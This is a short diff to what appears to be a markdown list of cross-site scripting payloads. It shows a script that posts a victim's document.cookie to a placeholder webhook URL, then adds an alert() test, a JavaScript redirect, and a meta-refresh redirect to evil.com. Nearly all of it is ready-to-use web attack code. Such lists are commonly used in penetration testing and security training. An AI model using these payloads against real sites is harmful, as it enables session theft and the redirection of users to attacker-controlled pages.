@@ -24,3 +24,15 @@ List of XSS payloads
 ```
 <script> fetch('WEBHOOK.SITE URL HERE', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
 ```
+
+```
+<script>alert("XSS");</script>
+```
+
+```
+<script>window.location.replace("https://example.com");</script>
+```
+
+```
+<meta http-equiv="refresh" content="0;url=http://evil.com">
+```
